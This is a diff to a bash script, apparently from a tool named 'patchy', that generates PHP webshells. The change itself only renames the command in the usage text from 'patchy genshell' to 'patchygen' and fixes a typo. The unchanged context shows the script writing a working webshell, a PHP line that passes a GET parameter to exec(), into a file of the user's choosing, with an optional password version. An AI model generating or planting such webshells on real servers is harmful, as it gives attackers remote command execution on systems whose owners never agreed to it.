@@ -5,10 +5,10 @@
 DIR=$(dirname $0)
 if [[ $1 == "-h" ]] || [[ -z $1 ]] && [[ -z $2 ]]; then
 	echo -e "Desc: Used to generate a webshell"
-	echo -e "Required Usage: patchy genshell webshell_file webshell_name"
+	echo -e "Required Usage: patchygen webshell_file webshell_name"
 	echo -e "Optional Usage: [-p]: set a password for php shell"
-	echo -e "	example: patshy genshell shell.php shell -p passw0rd!"
-	echo -e "		 patchy genshell /root/webshells/myshell.php nameofmyshell" 
+	echo -e "	example: patchygen shell.php shell -p passw0rd!"
+	echo -e "		 patchygen /root/webshells/myshell.php nameofmyshell" 
 elif [[ ! -z $1 ]] && [[ -z $3 ]] ; then
 	echo "Generating $2 with no password"
 	echo "<?php echo exec(\$_GET['${2}']); ?>" > $1
@@ -18,8 +18,8 @@ elif [[ ! -z $1 ]] && [[ $3 == "-p" ]] && [[ ! -z $4 ]]; then
 
 else
 	echo -e "Desc: Used to generate a webshell"
-	echo -e "Required Usage: patchy genshell webshell_file webshell_name"
+	echo -e "Required Usage: patchygen webshell_file webshell_name"
 	echo -e "Optional Usage: [-p]: set a password for php shell"
-	echo -e "       example: patshy genshell shell.php shell -p passw0rd!"
-	echo -e "                patchy genshell /root/webshells/myshell.php nameofmyshell" 
+	echo -e "       example: patchygen shell.php shell -p passw0rd!"
+	echo -e "                patchygen /root/webshells/myshell.php nameofmyshell" 
 fi
